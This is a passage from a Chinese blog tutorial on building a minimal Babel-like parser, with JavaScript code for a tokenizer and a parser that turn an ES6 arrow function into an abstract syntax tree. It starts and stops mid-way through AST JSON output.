&quot;line&quot;: 1,</span><br><span class="line">            &quot;column&quot;: 27</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;declarations&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;VariableDeclarator&quot;,</span><br><span class="line">            &quot;start&quot;: 6,</span><br><span class="line">            &quot;end&quot;: 27,</span><br><span class="line">            &quot;loc&quot;: &#123;</span><br><span class="line">              &quot;start&quot;: &#123;</span><br><span class="line">                &quot;line&quot;: 1,</span><br><span class="line">                &quot;column&quot;: 6</span><br><span class="line">              &#125;,</span><br><span class="line">              &quot;end&quot;: &#123;</span><br><span class="line">                &quot;line&quot;: 1,</span><br><span class="line">                &quot;column&quot;: 27</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;id&quot;: &#123;</span><br><span class="line">              &quot;type&quot;: &quot;Identifier&quot;,</span><br><span class="line">              &quot;start&quot;: 6,</span><br><span class="line">              &quot;end&quot;: 9,</span><br><span class="line">              &quot;loc&quot;: &#123;</span><br><span class="line">                &quot;start&quot;: &#123;</span><br><span class="line">                  &quot;line&quot;: 1,</span><br><span class="line">                  &quot;column&quot;: 6</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;end&quot;: &#123;</span><br><span class="line">                  &quot;line&quot;: 1,</span><br><span class="line">                  &quot;column&quot;: 9</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;identifierName&quot;: &quot;add&quot;</span><br><span class="line">              &#125;,</span><br><span class="line">              &quot;name&quot;: &quot;add&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;init&quot;: &#123;</span><br><span class="line">              &quot;type&quot;: &quot;ArrowFunctionExpression&quot;,</span><br><span class="line">              &quot;start&quot;: 12,</span><br><span class="line">              &quot;end&quot;: 27,</span><br><span class="line">              &quot;loc&quot;: &#123;</span><br><span class="line">                &quot;start&quot;: &#123;</span><br><span class="line">                  &quot;line&quot;: 1,</span><br><span class="line">                  &quot;column&quot;: 12</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;end&quot;: &#123;</span><br><span class="line">                  &quot;line&quot;: 1,</span><br><span class="line">                  &quot;column&quot;: 27</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;,</span><br><span class="line">              &quot;id&quot;: null,</span><br><span class="line">              &quot;generator&quot;: false,</span><br><span class="line">              &quot;expression&quot;: true,</span><br><span class="line">              &quot;async&quot;: false,</span><br><span class="line">              &quot;params&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                  &quot;type&quot;: &quot;Identifier&quot;,</span><br><span class="line">                  &quot;start&quot;: 13,</span><br><span class="line">                  &quot;end&quot;: 14,</span><br><span class="line">                  &quot;loc&quot;: &#123;</span><br><span class="line">                    &quot;start&quot;: &#123;</span><br><span class="line">                      &quot;line&quot;: 1,</span><br><span class="line">                      &quot;column&quot;: 13</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;end&quot;: &#123;</span><br><span class="line">                      &quot;line&quot;: 1,</span><br><span class="line">                      &quot;column&quot;: 14</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;identifierName&quot;: &quot;a&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &quot;name&quot;: &quot;a&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                  &quot;type&quot;: &quot;Identifier&quot;,</span><br><span class="line">                  &quot;start&quot;: 16,</span><br><span class="line">                  &quot;end&quot;: 17,</span><br><span class="line">                  &quot;loc&quot;: &#123;</span><br><span class="line">                    &quot;start&quot;: &#123;</span><br><span class="line">                      &quot;line&quot;: 1,</span><br><span class="line">                      &quot;column&quot;: 16</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;end&quot;: &#123;</span><br><span class="line">                      &quot;line&quot;: 1,</span><br><span class="line">                      &quot;column&quot;: 17</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;identifierName&quot;: &quot;b&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &quot;name&quot;: &quot;b&quot;</span><br><span class="line">                &#125;</span><br><span class="line">              ],</span><br><span class="line">              &quot;body&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;BinaryExpression&quot;,</span><br><span class="line">                &quot;start&quot;: 22,</span><br><span class="line">                &quot;end&quot;: 27,</span><br><span class="line">                &quot;loc&quot;: &#123;</span><br><span class="line">                  &quot;start&quot;: &#123;</span><br><span class="line">                    &quot;line&quot;: 1,</span><br><span class="line">                    &quot;column&quot;: 22</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &quot;end&quot;: &#123;</span><br><span class="line">                    &quot;line&quot;: 1,</span><br><span class="line">                    &quot;column&quot;: 27</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;left&quot;: &#123;</span><br><span class="line">                  &quot;type&quot;: &quot;Identifier&quot;,</span><br><span class="line">                  &quot;start&quot;: 22,</span><br><span class="line">                  &quot;end&quot;: 23,</span><br><span class="line">                  &quot;loc&quot;: &#123;</span><br><span class="line">                    &quot;start&quot;: &#123;</span><br><span class="line">                      &quot;line&quot;: 1,</span><br><span class="line">                      &quot;column&quot;: 22</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;end&quot;: &#123;</span><br><span class="line">                      &quot;line&quot;: 1,</span><br><span class="line">                      &quot;column&quot;: 23</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;identifierName&quot;: &quot;a&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &quot;name&quot;: &quot;a&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;operator&quot;: &quot;+&quot;,</span><br><span class="line">                &quot;right&quot;: &#123;</span><br><span class="line">                  &quot;type&quot;: &quot;Identifier&quot;,</span><br><span class="line">                  &quot;start&quot;: 26,</span><br><span class="line">                  &quot;end&quot;: 27,</span><br><span class="line">                  &quot;loc&quot;: &#123;</span><br><span class="line">                    &quot;start&quot;: &#123;</span><br><span class="line">                      &quot;line&quot;: 1,</span><br><span class="line">                      &quot;column&quot;: 26</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;end&quot;: &#123;</span><br><span class="line">                      &quot;line&quot;: 1,</span><br><span class="line">                      &quot;column&quot;: 27</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;identifierName&quot;: &quot;b&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &quot;name&quot;: &quot;b&quot;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;kind&quot;: &quot;const&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;directives&quot;: []</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们以解析上面的 es6箭头函数为目标,来写一个简单的 parser.</p>
<p>文本 —&gt; AST 的过程中有两个关键步骤:</p>
<ul>
<li>  词法分析: 将代码(字符串)分割为token流,即<strong>语法单元</strong>成的数组</li>
<li>  语法分析: 分析token流(上面生成的数组)并生成 AST</li>
</ul>
<h3 id="词法分析-Tokenizer-–-词法分析器"><a href="#词法分析-Tokenizer-–-词法分析器" class="headerlink" title="词法分析(Tokenizer – 词法分析器)"></a>词法分析(Tokenizer – 词法分析器)</h3><p><a href="https://www.teaspect.com/detail/5523#h3_5"></a></p>
<p>要做词法分析,首先我们需要明白在 JavaScript 中哪些属于<strong>语法单元</strong></p>
<ul>
<li>  数字：JavaScript 中的科学记数法以及普通数组都属于语法单元.</li>
<li>  括号：『(』『)』只要出现,不管任何意义都算是语法单元</li>
<li>  标识符：连续字符,常见的有变量,常量(例如: null true),关键字(if break)等等</li>
<li>  运算符：+、-、*、/等等</li>
<li>  当然还有注释,中括号等</li>
</ul>
<blockquote>
<p>在我们 parser 的过程中,应该换一个角度看待代码,我们平时工作用的代码.本质是就是字符串或者一段文本,它没有任何意义,是 JavaScript 引擎赋予了它意义,所以我们在解析过程中代码只是一段字符串.</p>
</blockquote>
<p>仍然以下面代码为例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const add &#x3D; (a, b) &#x3D;&gt; a + b</span><br></pre></td></tr></table></figure>

<p>我们期望的结果是类似这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123; type: &quot;identifier&quot;, value: &quot;const&quot; &#125;,</span><br><span class="line">  &#123; type: &quot;whitespace&quot;, value: &quot; &quot; &#125;,</span><br><span class="line">  ...</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>那么我们现在开始打造一个Tokenizer(词法分析器)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 词法分析器,接收字符串返回token数组</span><br><span class="line">export const tokenizer &#x3D; (code) &#x3D;&gt; &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 储存 token 的数组</span><br><span class="line">    const tokens  &#x3D; [];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 指针</span><br><span class="line">    let current &#x3D; 0;</span><br><span class="line"></span><br><span class="line">    while (current &lt; code.length) &#123;</span><br><span class="line">        &#x2F;&#x2F; 获取指针指向的字符</span><br><span class="line">        const char &#x3D; code[current];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 我们先处理单字符的语法单元 类似于&#96;;&#96; &#96;(&#96; &#96;)&#96;等等这种</span><br><span class="line">        if (char &#x3D;&#x3D;&#x3D; &#39;(&#39; || char &#x3D;&#x3D;&#x3D; &#39;)&#39;) &#123;</span><br><span class="line">            tokens.push(&#123;</span><br><span class="line">                type: &#39;parens&#39;,</span><br><span class="line">                value: char,</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            current ++;</span><br><span class="line"></span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 我们接着处理标识符,标识符一般为以字母、_、$开头的连续字符</span><br><span class="line">        if (&#x2F;[a-zA-Z\$\_]&#x2F;.test(char)) &#123;</span><br><span class="line">            let value &#x3D; &#39;&#39;;</span><br><span class="line">            value +&#x3D; char;</span><br><span class="line">            current ++;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 如果是连续字那么将其拼接在一起,随后指针后移</span><br><span class="line">            while (&#x2F;[a-zA-Z0-9\$\_]&#x2F;.test(code[current]) &amp;&amp; current &lt; code.length) &#123;</span><br><span class="line">                value +&#x3D; code[current];</span><br><span class="line">                current ++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            tokens.push(&#123;</span><br><span class="line">                type: &#39;identifier&#39;,</span><br><span class="line">                value,</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 处理空白字符</span><br><span class="line">        if (&#x2F;\s&#x2F;.test(char)) &#123;</span><br><span class="line">            let value &#x3D; &#39;&#39;;</span><br><span class="line">            value +&#x3D; char;</span><br><span class="line">            current ++;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;道理同上</span><br><span class="line">            while (&#x2F;\s]&#x2F;.test(code[current]) &amp;&amp; current &lt; code.length) &#123;</span><br><span class="line">                value +&#x3D; code[current];</span><br><span class="line">                current ++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            tokens.push(&#123;</span><br><span class="line">                type: &#39;whitespace&#39;,</span><br><span class="line">                value,</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 处理逗号分隔符</span><br><span class="line">        if (&#x2F;,&#x2F;.test(char)) &#123;</span><br><span class="line"></span><br><span class="line">            tokens.push(&#123;</span><br><span class="line">                type: &#39;,&#39;,</span><br><span class="line">                value: &#39;,&#39;,</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            current ++;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 处理运算符</span><br><span class="line">        if (&#x2F;&#x3D;|\+|&gt;&#x2F;.test(char)) &#123;</span><br><span class="line">            let value &#x3D; &#39;&#39;;</span><br><span class="line">            value +&#x3D; char;</span><br><span class="line">            current ++;</span><br><span class="line"></span><br><span class="line">            while (&#x2F;&#x3D;|\+|&gt;&#x2F;.test(code[current])) &#123;</span><br><span class="line">                value +&#x3D; code[current];</span><br><span class="line">                current ++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 当 &#x3D; 后面有 &gt; 时为箭头函数而非运算符</span><br><span class="line">            if (value &#x3D;&#x3D;&#x3D; &#39;&#x3D;&gt;&#39;) &#123;</span><br><span class="line">                tokens.push(&#123;</span><br><span class="line">                    type: &#39;ArrowFunctionExpression&#39;,</span><br><span class="line">                    value,</span><br><span class="line">                &#125;);</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            tokens.push(&#123;</span><br><span class="line">                type: &#39;operator&#39;,</span><br><span class="line">                value,</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 如果碰到我们词法分析器以外的字符,则报错</span><br><span class="line">        throw new TypeError(&#39;I dont know what this character is: &#39; + char);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return tokens;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>那么我们基本的词法分析器就打造完成,因为只针对这一个es6函数,所以没有做额外的工作(额外的工作量会非常庞大).</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const result &#x3D; tokenizer(&#39;const add &#x3D; (a, b) &#x3D;&gt; a + b&#39;)</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line">[ &#123; type: &#39;identifier&#39;, value: &#39;const&#39; &#125;,</span><br><span class="line">  &#123; type: &#39;whitespace&#39;, value: &#39; &#39; &#125;,</span><br><span class="line">  &#123; type: &#39;identifier&#39;, value: &#39;add&#39; &#125;,</span><br><span class="line">  &#123; type: &#39;whitespace&#39;, value: &#39; &#39; &#125;,</span><br><span class="line">  &#123; type: &#39;operator&#39;, value: &#39;&#x3D;&#39; &#125;,</span><br><span class="line">  &#123; type: &#39;whitespace&#39;, value: &#39; &#39; &#125;,</span><br><span class="line">  &#123; type: &#39;parens&#39;, value: &#39;(&#39; &#125;,</span><br><span class="line">  &#123; type: &#39;identifier&#39;, value: &#39;a&#39; &#125;,</span><br><span class="line">  &#123; type: &#39;,&#39;, value: &#39;,&#39; &#125;,</span><br><span class="line">  &#123; type: &#39;whitespace&#39;, value: &#39; &#39; &#125;,</span><br><span class="line">  &#123; type: &#39;identifier&#39;, value: &#39;b&#39; &#125;,</span><br><span class="line">  &#123; type: &#39;parens&#39;, value: &#39;)&#39; &#125;,</span><br><span class="line">  &#123; type: &#39;whitespace&#39;, value: &#39; &#39; &#125;,</span><br><span class="line">  &#123; type: &#39;ArrowFunctionExpression&#39;, value: &#39;&#x3D;&gt;&#39; &#125;,</span><br><span class="line">  &#123; type: &#39;whitespace&#39;, value: &#39; &#39; &#125;,</span><br><span class="line">  &#123; type: &#39;identifier&#39;, value: &#39;a&#39; &#125;,</span><br><span class="line">  &#123; type: &#39;whitespace&#39;, value: &#39; &#39; &#125;,</span><br><span class="line">  &#123; type: &#39;operator&#39;, value: &#39;+&#39; &#125;,</span><br><span class="line">  &#123; type: &#39;whitespace&#39;, value: &#39; &#39; &#125;,</span><br><span class="line">  &#123; type: &#39;identifier&#39;, value: &#39;b&#39; &#125; ]</span><br><span class="line">**&#x2F;</span><br></pre></td></tr></table></figure>

<h4 id="1-3-语法分析"><a href="#1-3-语法分析" class="headerlink" title="1.3 语法分析"></a>1.3 语法分析</h4><p>语法分析要比词法分析复杂得多,因为我们接下来的是<em>示意代码</em>,所以做了很多“武断”的判断来省略代码,即使这样也是整个微型 babel 中代码量最多的.</p>
<p>语法分析之所以复杂,是因为要分析各种语法的可能性,需要开发者根据token流(上一节我们生成的 token 数组)提供的信息来分析出代码之间的逻辑关系,只有经过词法分析 token 流才能成为有结构的抽象语法树.</p>
<p>做语法分析最好依照标准,大多数 JavaScript Parser 都遵循<a href="https://github.com/estree/estree">estree规范</a></p>
<p>由于标准内容很多,感兴趣的可以去阅读,我们目前只介绍几个比较重要的标准:</p>
<p>语句(Statements): 语句是 JavaScript 中非常常见的语法,我们常见的循环、if 判断、异常处理语句、with 语句等等都属于语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 典型的for 循环语句</span><br><span class="line">for (var i &#x3D; 0; i &lt; 7; i++) &#123;</span><br><span class="line">  console.log(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>表达式(Expressions): 表达式是一组代码的集合，它返回一个值,表达式是另一个十分常见的语法,函数表达式就是一种典型的表达式,如果你不理解什么是表达式, MDN上有很详细的解释.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 函数表达式</span><br><span class="line">var add &#x3D; function(a, b) &#123;</span><br><span class="line">  return  a + b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>声明(Declarations): 声明分为变量声明和函数声明,表达式(Expressions)中的函数表达式的例子用声明的写法就是下面这样.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 函数声明 function add(a, b) &#123; return a + b &#125; </span><br></pre></td></tr></table></figure>

<p>你可能有点糊涂,为了理清其中的关系,我们就下面的代码为例来解读</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 函数表达式 var add &#x3D; function(a, b) &#123; return  a + b &#125; </span><br></pre></td></tr></table></figure>

<p>首先这段代码的整体本质是是一个变量声明(VariableDeclarator):</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-0f6a16cdd718ccee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>而变量被声明为一个函数表达式(FunctionExpression):</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-09b89c3c4c7c144a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>函数表达式中的大括号在内的为块状语句(BlockStatement):</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-e14d32f3fbd82c48.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>块状语句内 return 的部分是返回语句(ReturnStatement):</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-cffac33717acd685.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>而 return 的其实是一个二元运算符或者叫二元表达式(BinaryExpression):</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-62779a6758708913.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>上面提到的这些有些属于表达式,有些属于声明也有些属于语句,当然还有更多我们没提到的,它们被语法分析之后被叫做AST(抽象语法树).</p>
<p>我们做语法分析的时候思路也是类似的,要分析哪一层的 token 到底属于表达式或者说语句,如果是语句那么是块状语句(BlockStatement)还是Loops,如果是 Loops 那么属于while 循环(WhileStatement)还是for 循环(ForStatement)等等,其中甚至难免要考虑作用域的问题,因此语法分析的复杂也体现在此.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const parser &#x3D; tokens &#x3D;&gt; &#123;</span><br><span class="line">    &#x2F;&#x2F; 声明一个全时指针，它会一直存在</span><br><span class="line">    let current &#x3D; -1;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 声明一个暂存栈,用于存放临时指针</span><br><span class="line">    const tem &#x3D; [];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 指针指向的当前token</span><br><span class="line">    let token &#x3D; tokens[current];</span><br><span class="line"></span><br><span class="line">    const parseDeclarations &#x3D; () &#x3D;&gt; &#123;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 暂存当前指针</span><br><span class="line">        setTem();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 指针后移</span><br><span class="line">        next();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 如果字符为&#39;const&#39;可见是一个声明</span><br><span class="line">        if (token.type &#x3D;&#x3D;&#x3D; &#39;identifier&#39; &amp;&amp; token.value &#x3D;&#x3D;&#x3D; &#39;const&#39;) &#123;</span><br><span class="line">            const declarations &#x3D; &#123;</span><br><span class="line">                type: &#39;VariableDeclaration&#39;,</span><br><span class="line">                kind: token.value</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            next();</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; const 后面要跟变量的,如果不是则报错</span><br><span class="line">            if (token.type !&#x3D;&#x3D; &#39;identifier&#39;) &#123;</span><br><span class="line">                throw new Error(&#39;Expected Variable after const&#39;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 我们获取到了变量名称</span><br><span class="line">            declarations.identifierName &#x3D; token.value;</span><br><span class="line"></span><br><span class="line">            next();</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 如果跟着 &#39;&#x3D;&#39; 那么后面应该是个表达式或者常量之类的,额外判断的代码就忽略了,直接解析函数表达式</span><br><span class="line">            if (token.type &#x3D;&#x3D;&#x3D; &#39;operator&#39; &amp;&amp; token.value &#x3D;&#x3D;&#x3D; &#39;&#x3D;&#39;) &#123;</span><br><span class="line">                declarations.init &#x3D; parseFunctionExpression();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return declarations;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    const parseFunctionExpression &#x3D; () &#x3D;&gt; &#123;</span><br><span class="line">        next();</span><br><span class="line"></span><br><span class="line">        let init;</span><br><span class="line">        &#x2F;&#x2F; 如果 &#39;&#x3D;&#39; 后面跟着括号或者字符那基本判断是一个表达式</span><br><span class="line">        if (</span><br><span class="line">            (token.type &#x3D;&#x3D;&#x3D; &#39;parens&#39; &amp;&amp; token.value &#x3D;&#x3D;&#x3D; &#39;(&#39;) ||</span><br><span class="line">            token.type &#x3D;&#x3D;&#x3D; &#39;identifier&#39;</span><br><span class="line">        ) &#123;</span><br><span class="line">            setTem();</span><br><span class="line">            next();</span><br><span class="line">            while (token.type &#x3D;&#x3D;&#x3D; &#39;identifier&#39; || token.type &#x3D;&#x3D;&#x3D; &#39;,&#39;) &#123;</span><br><span class="line">                next();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 如果括号后跟着箭头,那么判断是箭头函数表达式</span><br><span class="line">            if (token.type &#x3D;&#x3D;&#x3D; &#39;parens&#39; &amp;&amp; token.value &#x3D;&#x3D;&#x3D; &#39;)&#39;) &#123;</span><br><span class="line">                next();</span><br><span class="line">                if (token.type &#x3D;&#x3D;&#x3D; &#39;ArrowFunctionExpression&#39;) &#123;</span><br><span class="line">                    init &#x3D; &#123;</span><br><span class="line">                        type: &#39;ArrowFunctionExpression&#39;,</span><br><span class="line">                        params: [],</span><br><span class="line">                        body: &#123;&#125;</span><br><span class="line">                    &#125;;</span><br><span class="line"></span><br><span class="line">                    backTem();</span><br><span class="line"></span><br><span class="line">                    &#x2F;&#x2F; 解析箭头函数的参数</span><br><span class="line">                    init.params &#x3D; parseParams();</span><br><span class="line"></span><br><span class="line">                    &#x2F;&#x2F; 解析箭头函数的函数主体</span><br><span class="line">                    init.body &#x3D; parseExpression();</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    backTem();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return init;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    const parseParams &#x3D; () &#x3D;&gt; &#123;</span><br><span class="line">        const params &#x3D; [];</span><br><span class="line">        if (token.type &#x3D;&#x3D;&#x3D; &#39;parens&#39; &amp;&amp; token.value &#x3D;&#x3D;&#x3D; &#39;(&#39;) &#123;</span><br><span class="line">            next();</span><br><span class="line">            while (token.type !&#x3D;&#x3D; &#39;parens&#39; &amp;&amp; token.value !&#x3D;&#x3D; &#39;)&#39;) &#123;</span><br><span class="line">                if (token.type &#x3D;&#x3D;&#x3D; &#39;identifier&#39;) &#123;</span><br><span class="line">                    params.push(&#123;</span><br><span class="line">                        type: token.type,</span><br><span class="line">                        identifierName: token.value</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                next();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return params;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    const parseExpression &#x3D; () &#x3D;&gt; &#123;</span><br><span class="line">        next();</span><br><span class="line">        let body;</span><br><span class="line">        while (token.type &#x3D;&#x3D;&#x3D; &#39;ArrowFunctionExpression&#39;) &#123;</span><br><span class="line">            next();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 如果以(开头或者变量开头说明不是 BlockStatement,我们以二元表达式来解析</span><br><span class="line">        if (token.type &#x3D;&#x3D;&#x3D; &#39;identifier&#39;) &#123;</span><br><span class="line">            body &#x3D; &#123;</span><br><span class="line">                type: &#39;BinaryExpression&#39;,</span><br><span class="line">                left: &#123;</span><br><span class="line">                    type: &#39;identifier&#39;,</span><br><span class="line">                    identifierName: token.value</span><br><span class="line">                &#125;,</span><br><span class="line">                operator: &#39;&#39;,</span><br><span class="line">                right: &#123;</span><br><span class="line">                    type: &#39;&#39;,</span><br><span class="line">                    identifierName: &#39;&#39;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            next();</span><br><span class="line"></span><br><span class="line">            if (token.type &#x3D;&#x3D;&#x3D; &#39;operator&#39;) &#123;</span><br><span class="line">                body.operator &#x3D; token.value;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            next();</span><br><span class="line"></span><br><span class="line">            if (token.type &#x3D;&#x3D;&#x3D; &#39;identifier&#39;) &#123;</span><br><span class="line">                body.right &#x3D; &#123;</span><br><span class="line">                    type: &#39;identifier&#39;,</span><br><span class="line">                    identifierName: token.value</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return body;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 指针后移的函数</span><br><span class="line">    const next &#x3D; () &#x3D;&gt; &#123;</span><br><span class="line">        do &#123;</span><br><span class="line">            ++current;</span><br><span class="line">            token &#x3D; tokens[current]</span><br><span class="line">                ? tokens[current]</span><br><span class="line">                : &#123; type: &#39;eof&#39;, value: &#39;&#39; &#125;;</span><br><span class="line">        &#125; while (token.type &#x3D;&#x3D;&#x3D; &#39;whitespace&#39;);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 指针暂存的函数</span><br><span class="line">    const setTem &#x3D; () &#x3D;&gt; &#123;</span><br><span class="line">        tem.push(current);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 指针回退的函数</span><br><span class="line">    const backTem &#x3D; () &#x3D;&gt; &#123;</span><br><span class="line">        current &#x3D; tem.pop();</span><br><span class="line">        token &#x3D; tokens[current];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    const ast &#x3D; &#123;</span><br><span class="line">        type: &#39;Program&#39;,</span><br><span class="line">        body: []</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    while (current &lt; tokens.length) &#123;</span><br><span class="line">        const statement &#x3D; parseDeclarations();</span><br><span class="line">        if (!statement) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        ast.body.push(statement);</span><br><span class="line">    &#125;</span><br><span class="line">    return ast;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>至此我们<em>暴力</em>parser 了token 流,最终得到了简陋的抽象语法树:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;Program&quot;,</span><br><span class="line">    &quot;body&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;type&quot;: &quot;VariableDeclaration&quot;,</span><br><span class="line">            &quot;identifierName&quot;: &quot;add&quot;,</span><br><span class="line">            &quot;init&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;ArrowFunctionExpression&quot;,</span><br><span class="line">                &quot;params&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;type&quot;: &quot;identifier&quot;,</span><br><span class="line">                        &quot;identifierName&quot;: &quot;a&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;type&quot;: &quot;identifier&quot;,</span><br><span class="line">                        &quot;identifierName&quot;: &quot;b&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                ],</span><br><span class="line">                &quot;body&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;BinaryExpression&quot;,</span><br><span class="line">                    &quot;left&quot;: &#123;</span><br><span class="line">                        